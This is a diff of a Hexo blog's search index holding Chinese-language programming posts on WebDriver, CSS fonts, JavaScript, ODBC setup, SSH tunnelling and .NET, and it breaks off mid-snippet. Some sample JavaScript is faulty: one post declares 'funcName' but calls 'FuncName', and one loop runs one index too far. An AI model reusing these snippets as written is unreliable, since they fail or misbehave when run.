@@ -134,8 +134,8 @@
     <url>/2020/08/31/AngularProtractorWebDriver/</url>
     <content><![CDATA[<h1 id="安裝-WebDriver"><a class="header-anchor" href="#安裝-WebDriver"></a>安裝 WebDriver</h1>
 <p>先清除目前下載的 WebDriver</p>
-<span id="more"></span>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx  webdriver-manager clean</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
 <p>以 chrome 為例從<a href="http://chromedriver.chromium.org/">chromedriver網頁</a></p>
 <p>查詢所需的版本號</p>
 <p>接下來依版本下載 WebDriver</p>
@@ -290,6 +290,30 @@
       </tags>
   </entry>
   <entry>
+    <title>網頁自訂字型</title>
+    <url>/2021/10/23/HtmlFontCss/</url>
+    <content><![CDATA[<h1 id="產生字型檔"><a class="header-anchor" href="#產生字型檔"></a>產生字型檔</h1>
+<p>WOFF2 檔為壓縮後的檔案，通常會有更快的加載速度，可參考這篇 <a href="/2021/10/23/PythonFontForgeTransfer/" title="使用 Python Script 進行 FontForge 字型檔轉換">FontForgeTransfer</a> ，產生網頁字型 WOFF2 檔</p>
+<span id="more"></span>
+<h1 id="嵌入字型"><a class="header-anchor" href="#嵌入字型"></a>嵌入字型</h1>
+<p>透過 CSS 嵌入字型</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&#x27;[字型名稱]&#x27;</span>;</span><br><span class="line">  <span class="attribute">font-style</span>: normal;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">400</span>;</span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">/url/to/[檔案].woff2</span>) <span class="built_in">format</span>(<span class="string">&quot;woff2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face">@font-face</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>HTML</category>
+      </categories>
+      <tags>
+        <tag>HTML</tag>
+        <tag>CSS</tag>
+        <tag>FontForge</tag>
+        <tag>Font</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>JSON 格式資料如何拆解成 form 的輸入項</title>
     <url>/2020/03/27/HtmlFormPost/</url>
     <content><![CDATA[<h1 id="拆解-JSON-格式資料"><a class="header-anchor" href="#拆解-JSON-格式資料"></a>拆解 JSON 格式資料</h1>
@@ -311,10 +335,10 @@
 </ol>
 </div>]]></content>
       <categories>
-        <category>Html</category>
+        <category>HTML</category>
       </categories>
       <tags>
-        <tag>Html</tag>
+        <tag>HTML</tag>
         <tag>JSON</tag>
       </tags>
   </entry>
@@ -392,29 +416,6 @@
       </tags>
   </entry>
   <entry>
-    <title>如何判斷 Function 是否存在</title>
-    <url>/2019/12/28/JsFunction/</url>
-    <content><![CDATA[<h1 id="建立-function"><a class="header-anchor" href="#建立-function"></a>建立 function</h1>
-<p>建立一個名稱為 TEST 的 function</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">TEST</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;call function TEST&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="判斷-function-是否存在"><a class="header-anchor" href="#判斷-function-是否存在"></a>判斷 function 是否存在</h1>
-<p>判斷 function 是否存在 Window 變數中，並執行</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> funcName = <span class="string">&#x27;TEST&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_">typeof</span>(<span class="variable language_">window</span>[<span class="title class_">FuncName</span>]) === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 執行方法</span></span><br><span class="line">    <span class="variable language_">window</span>[<span class="title class_">FuncName</span>]();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;此方法不存在&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/typeof">MDN typeof</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>Javascript</category>
-      </categories>
-      <tags>
-        <tag>Javascript</tag>
-        <tag>Function</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>如何將檔案轉成 Base64 編碼</title>
     <url>/2019/12/09/JsFileToBase64/</url>
     <content><![CDATA[<h1 id="建立-HTML"><a class="header-anchor" href="#建立-HTML"></a>建立 HTML</h1>
@@ -435,6 +436,29 @@
       <tags>
         <tag>Javascript</tag>
         <tag>Base64</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何判斷 Function 是否存在</title>
+    <url>/2019/12/28/JsFunction/</url>
+    <content><![CDATA[<h1 id="建立-function"><a class="header-anchor" href="#建立-function"></a>建立 function</h1>
+<p>建立一個名稱為 TEST 的 function</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">TEST</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;call function TEST&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="判斷-function-是否存在"><a class="header-anchor" href="#判斷-function-是否存在"></a>判斷 function 是否存在</h1>
+<p>判斷 function 是否存在 Window 變數中，並執行</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> funcName = <span class="string">&#x27;TEST&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_">typeof</span>(<span class="variable language_">window</span>[<span class="title class_">FuncName</span>]) === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 執行方法</span></span><br><span class="line">    <span class="variable language_">window</span>[<span class="title class_">FuncName</span>]();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;此方法不存在&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/typeof">MDN typeof</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Javascript</category>
+      </categories>
+      <tags>
+        <tag>Javascript</tag>
+        <tag>Function</tag>
       </tags>
   </entry>
   <entry>
@@ -467,36 +491,6 @@
       </tags>
   </entry>
   <entry>
-    <title>如何迭代 Js 物件</title>
-    <url>/2020/03/27/JsIteratorObject/</url>
-    <content><![CDATA[<h1 id="使用-for…in"><a class="header-anchor" href="#使用-for…in"></a>使用 for…in</h1>
-<p>方法格式如下</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (變數 <span class="keyword">in</span> 物件) &#123;...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<p>下方為 Sample Code</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> model = &#123;</span><br><span class="line">    <span class="attr">item</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> filed <span class="keyword">in</span> model) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(model[filed]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="使用-Object-keys"><a class="header-anchor" href="#使用-Object-keys"></a>使用 Object.keys()</h1>
-<p>方法格式如下</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">keys</span>(物件);</span><br></pre></td></tr></table></figure>
-<p>下方為 Sample Code</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> model = &#123;</span><br><span class="line">    <span class="attr">item</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(model);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> length = keys.<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> key =  keys[i];</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(model[key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="差異"><a class="header-anchor" href="#差異"></a>差異</h1>
-<p>Object.keys 與 for…in 不同之處</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for-in 迴圈還會迭代出物件自其原型鏈所繼承來的可列舉屬性</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/keys">MDN Object keys</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>Javascript</category>
-      </categories>
-      <tags>
-        <tag>Javascript</tag>
-        <tag>Object</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>如何將圖片壓縮並下載檔案</title>
     <url>/2019/12/25/JsPictureCompress/</url>
     <content><![CDATA[<h1 id="建立-HTML"><a class="header-anchor" href="#建立-HTML"></a>建立 HTML</h1>
@@ -517,6 +511,56 @@
       <tags>
         <tag>Javascript</tag>
         <tag>Canvas</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何迭代 Js 物件</title>
+    <url>/2020/03/27/JsIteratorObject/</url>
+    <content><![CDATA[<h1 id="使用-for…in"><a class="header-anchor" href="#使用-for…in"></a>使用 for…in</h1>
+<p>方法格式如下</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (變數 <span class="keyword">in</span> 物件) &#123;...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>下方為 Sample Code</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> model = &#123;</span><br><span class="line">    <span class="attr">item</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> filed <span class="keyword">in</span> model) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(model[filed]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="使用-Object-keys"><a class="header-anchor" href="#使用-Object-keys"></a>使用 Object.keys()</h1>
+<p>方法格式如下</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">keys</span>(物件);</span><br></pre></td></tr></table></figure>
+<p>下方為 Sample Code</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> model = &#123;</span><br><span class="line">    <span class="attr">item</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(model);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> length = keys.<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> key =  keys[i];</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(model[key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="差異"><a class="header-anchor" href="#差異"></a>差異</h1>
+<p>Object.keys 與 for…in 不同之處</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">for-in 迴圈還會迭代出物件自其原型鏈所繼承來的可列舉屬性</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/keys">MDN Object keys</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Javascript</category>
+      </categories>
+      <tags>
+        <tag>Javascript</tag>
+        <tag>Object</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何使用 Regex 群組</title>
+    <url>/2022/05/22/JsRegexGroup/</url>
+    <content><![CDATA[<h1 id="使用-Regex-群組"><a class="header-anchor" href="#使用-Regex-群組"></a>使用 Regex 群組</h1>
+<p>群組方法用法如下</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 建立規則</span></span><br><span class="line"><span class="keyword">var</span> myRegexp = <span class="regexp">/(?&lt;群組名稱&gt;.*)Test/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 執行規則</span></span><br><span class="line"><span class="keyword">var</span> match =  myRegexp.<span class="title function_">exec</span>(<span class="string">&#x27;123Test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取得執行結果 output: 123</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(match.<span class="property">groups</span>.群組名稱);</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions/Groups_and_Ranges">MDN</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Javascript</category>
+      </categories>
+      <tags>
+        <tag>Javascript</tag>
+        <tag>Regex</tag>
       </tags>
   </entry>
   <entry>
@@ -549,23 +593,61 @@
       </tags>
   </entry>
   <entry>
-    <title>如何使用 Regex 群組</title>
-    <url>/2022/05/22/JsRegexGroup/</url>
-    <content><![CDATA[<h1 id="使用-Regex-群組"><a class="header-anchor" href="#使用-Regex-群組"></a>使用 Regex 群組</h1>
-<p>群組方法用法如下</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 建立規則</span></span><br><span class="line"><span class="keyword">var</span> myRegexp = <span class="regexp">/(?&lt;群組名稱&gt;.*)Test/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 執行規則</span></span><br><span class="line"><span class="keyword">var</span> match =  myRegexp.<span class="title function_">exec</span>(<span class="string">&#x27;123Test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取得執行結果 output: 123</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(match.<span class="property">groups</span>.群組名稱);</span><br></pre></td></tr></table></figure>
+    <title>Linux MSSQL ODBC 手動安裝</title>
+    <url>/2021/10/05/LinuxMssqlOdbc/</url>
+    <content><![CDATA[<h1 id="配置-Linux-ODBC-元件"><a class="header-anchor" href="#配置-Linux-ODBC-元件"></a>配置 Linux ODBC 元件</h1>
+<p>安裝 Linux ODBC 元件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install unixodbc</span><br></pre></td></tr></table></figure>
 <span id="more"></span>
+<h1 id="安裝-ODBC-Driver"><a class="header-anchor" href="#安裝-ODBC-Driver"></a>安裝 ODBC Driver</h1>
+<p>登入<a href="https://docs.microsoft.com/en-us/sql/connect/odbc/download-odbc-driver-for-sql-server?view=sql-server-ver15">Microsoft網頁</a>下載Odbc Driver並安裝</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i msodbcsql17_17.8.1.1-1_amd64.deb</span><br></pre></td></tr></table></figure>
+<p>查看 Linux ODBC Drivers 設定檔位置</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">odbcinst -j</span><br></pre></td></tr></table></figure>
+<p>查看設定檔是否出現 ODBC Driver 17 for SQL Server 的設定</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/odbcinst.ini</span><br></pre></td></tr></table></figure>
 <div class="note warning"><p>📜 參考資料</p>
 <ol>
-<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions/Groups_and_Ranges">MDN</a></li>
+<li><a href="https://www.ibm.com/docs/en/db2/11.5?topic=managers-installing-unixodbc-driver-manager">Installing the unixODBC driver manager</a></li>
 </ol>
 </div>]]></content>
       <categories>
-        <category>Javascript</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>Javascript</tag>
-        <tag>Regex</tag>
+        <tag>Linux</tag>
+        <tag>Ubuntu</tag>
+        <tag>ODBC</tag>
+        <tag>MSSQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用 SSH 建立通道</title>
+    <url>/2023/05/07/LinuxSshTunnel/</url>
+    <content><![CDATA[<h1 id="本機特定端口轉發至跳板機"><a class="header-anchor" href="#本機特定端口轉發至跳板機"></a>本機特定端口轉發至跳板機</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -g -L [本地端口]:[遠端服務IP]:[遠端服務端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="跳板機轉發至本機特定端口"><a class="header-anchor" href="#跳板機轉發至本機特定端口"></a>跳板機轉發至本機特定端口</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -R 0.0.0.0:[跳板機端口]:localhost:[本地端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
+<h1 id="請求轉發至跳板，可搭配-Whistle-做-Socks-代理"><a class="header-anchor" href="#請求轉發至跳板，可搭配-Whistle-做-Socks-代理"></a>請求轉發至跳板，可搭配 Whistle 做 Socks 代理</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -D localhost:[本地端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
+<h1 id="ssh-執行選項說明"><a class="header-anchor" href="#ssh-執行選項說明"></a>ssh 執行選項說明</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-L: 指定將本機上的特定端口轉發到遠端主機</span><br><span class="line">-R: 表示使用遠程端口轉發創建ssh隧道</span><br><span class="line">-D: port動態應用級端口轉​​發</span><br><span class="line">-p: 跳板機端口</span><br><span class="line">-C: 使用數據壓縮</span><br><span class="line">-c: cipher_spec選擇用於加密會話的密碼規範</span><br><span class="line">-f: 代表後台運行程序</span><br><span class="line">-F: configfile指定每個用戶的配置文件</span><br><span class="line">-N: 不要執行任何遠端指令</span><br><span class="line">-g: 允許遠程主機連接到本地轉發端口</span><br></pre></td></tr></table></figure>
+<!-- /etc/ssh/sshd_config 加入GatewayPorts 設定，能讓所有人都連到 -->
+<!-- scoop install putty
+plink -v -x -a -T -C -noagent -ssh -pw "[密碼]" -P 50893 -L [本地端口]:[遠端服務IP]:[遠端服務端口] [帳號]@[跳板機IP] -->
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://www.ssh.com/academy/ssh/command">SSH Command - Usage, Options, Configuration</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Ubuntu</tag>
+        <tag>Ssh</tag>
       </tags>
   </entry>
   <entry>
@@ -653,64 +735,6 @@ sudo iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT -->
         <tag>Linux</tag>
         <tag>Ubuntu</tag>
         <tag>Nat</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux MSSQL ODBC 手動安裝</title>
-    <url>/2021/10/05/LinuxMssqlOdbc/</url>
-    <content><![CDATA[<h1 id="配置-Linux-ODBC-元件"><a class="header-anchor" href="#配置-Linux-ODBC-元件"></a>配置 Linux ODBC 元件</h1>
-<p>安裝 Linux ODBC 元件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install unixodbc</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="安裝-ODBC-Driver"><a class="header-anchor" href="#安裝-ODBC-Driver"></a>安裝 ODBC Driver</h1>
-<p>登入<a href="https://docs.microsoft.com/en-us/sql/connect/odbc/download-odbc-driver-for-sql-server?view=sql-server-ver15">Microsoft網頁</a>下載Odbc Driver並安裝</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i msodbcsql17_17.8.1.1-1_amd64.deb</span><br></pre></td></tr></table></figure>
-<p>查看 Linux ODBC Drivers 設定檔位置</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">odbcinst -j</span><br></pre></td></tr></table></figure>
-<p>查看設定檔是否出現 ODBC Driver 17 for SQL Server 的設定</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/odbcinst.ini</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://www.ibm.com/docs/en/db2/11.5?topic=managers-installing-unixodbc-driver-manager">Installing the unixODBC driver manager</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>Ubuntu</tag>
-        <tag>ODBC</tag>
-        <tag>MSSQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用 SSH 建立通道</title>
-    <url>/2023/05/07/LinuxSshTunnel/</url>
-    <content><![CDATA[<h1 id="本機特定端口轉發至跳板機"><a class="header-anchor" href="#本機特定端口轉發至跳板機"></a>本機特定端口轉發至跳板機</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -g -L [本地端口]:[遠端服務IP]:[遠端服務端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="跳板機轉發至本機特定端口"><a class="header-anchor" href="#跳板機轉發至本機特定端口"></a>跳板機轉發至本機特定端口</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -R 0.0.0.0:[跳板機端口]:localhost:[本地端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
-<h1 id="請求轉發至跳板，可搭配-Whistle-做-Socks-代理"><a class="header-anchor" href="#請求轉發至跳板，可搭配-Whistle-做-Socks-代理"></a>請求轉發至跳板，可搭配 Whistle 做 Socks 代理</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -D localhost:[本地端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
-<h1 id="ssh-執行選項說明"><a class="header-anchor" href="#ssh-執行選項說明"></a>ssh 執行選項說明</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-L: 指定將本機上的特定端口轉發到遠端主機</span><br><span class="line">-R: 表示使用遠程端口轉發創建ssh隧道</span><br><span class="line">-D: port動態應用級端口轉​​發</span><br><span class="line">-p: 跳板機端口</span><br><span class="line">-C: 使用數據壓縮</span><br><span class="line">-c: cipher_spec選擇用於加密會話的密碼規範</span><br><span class="line">-f: 代表後台運行程序</span><br><span class="line">-F: configfile指定每個用戶的配置文件</span><br><span class="line">-N: 不要執行任何遠端指令</span><br><span class="line">-g: 允許遠程主機連接到本地轉發端口</span><br></pre></td></tr></table></figure>
-<!-- /etc/ssh/sshd_config 加入GatewayPorts 設定，能讓所有人都連到 -->
-<!-- scoop install putty
-plink -v -x -a -T -C -noagent -ssh -pw "[密碼]" -P 50893 -L [本地端口]:[遠端服務IP]:[遠端服務端口] [帳號]@[跳板機IP] -->
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://www.ssh.com/academy/ssh/command">SSH Command - Usage, Options, Configuration</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>Ubuntu</tag>
-        <tag>Ssh</tag>
       </tags>
   </entry>
   <entry>
@@ -1036,8 +1060,8 @@ plink -v -x -a -T -C -noagent -ssh -pw "[密碼]" -P 50893 -L [本地端口]:[�
       </categories>
       <tags>
         <tag>Linux</tag>
-        <tag>.Net</tag>
         <tag>Font</tag>
+        <tag>.Net</tag>
         <tag>Big5</tag>
         <tag>Unicode</tag>
       </tags>
@@ -1114,11 +1138,41 @@ dotnet-dump collect --process-id 1902 -->
       </tags>
   </entry>
   <entry>
+    <title>使用 Expression Trees 把 List&lt;T&gt; 轉成 CSV 字串</title>
+    <url>/2024/05/01/NetExpressionListToCsv/</url>
+    <content><![CDATA[<h1 id="宣告類別"><a class="header-anchor" href="#宣告類別"></a>宣告類別</h1>
+<p>類別內容如下</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">User</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>List 內容如下</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">List&lt;User&gt; users = <span class="keyword">new</span> List&lt;User&gt;&#123;</span><br><span class="line">    <span class="keyword">new</span> User &#123;</span><br><span class="line">        Name = <span class="string">&quot;Test1&quot;</span>,</span><br><span class="line">        Age = <span class="number">10</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">new</span> User &#123;</span><br><span class="line">        Name = <span class="string">&quot;Test2&quot;</span>,</span><br><span class="line">        Age = <span class="number">20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="產生-Expression-表達式"><a class="header-anchor" href="#產生-Expression-表達式"></a>產生 Expression 表達式</h1>
+<p>建立轉換方法</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Linq.Expressions;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title">List</span>&lt;<span class="title">string</span>&gt; <span class="title">selectToCsv</span>&lt;<span class="title">T</span>&gt;(<span class="params"><span class="keyword">this</span> List&lt;T&gt; list, <span class="built_in">string</span> delimiter</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Type source = <span class="keyword">typeof</span>(T);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取得類別欄位</span></span><br><span class="line">    PropertyInfo[] prop = source.GetProperties();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 類別使用 t 表達 </span></span><br><span class="line">    ParameterExpression t = Expression.Parameter(source, <span class="string">&quot;t&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取得轉成字串方法</span></span><br><span class="line">    MethodInfo toString = <span class="keyword">typeof</span>(<span class="built_in">object</span>).GetMethod(<span class="string">&quot;ToString&quot;</span>);</span><br><span class="line"></span><br><span class="line">    List&lt;ConditionalExpression&gt; parameters = <span class="keyword">new</span> List&lt;ConditionalExpression&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (PropertyInfo p <span class="keyword">in</span> prop)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 類別欄位使用 t.Name, t.Age 表達</span></span><br><span class="line">        MemberExpression propertyValue = Expression.PropertyOrField(t, p.Name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 非字串型別欄位進行字串轉換 t.Name.ToString(), t.Age.ToString()</span></span><br><span class="line">        MethodCallExpression propertyToString = Expression.Call(propertyValue, toString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// NULL 值</span></span><br><span class="line">        ConstantExpression constantNull = Expression.Constant(<span class="literal">null</span>, <span class="keyword">typeof</span>(<span class="built_in">object</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 非字串型別欄位需進行字串轉換後，在做 NULL 判斷</span></span><br><span class="line">        BinaryExpression isNull = Expression.Equal(propertyToString, constantNull);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p.PropertyType == <span class="keyword">typeof</span>(<span class="built_in">string</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 字串型別欄位直接進行 NULL 判斷</span></span><br><span class="line">            isNull = Expression.Equal(propertyValue, constantNull);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 空字串值</span></span><br><span class="line">        ConstantExpression constantEmpty = Expression.Constant(<span class="built_in">string</span>.Empty, <span class="keyword">typeof</span>(<span class="built_in">string</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// IIF 判斷 t.Name == null ? 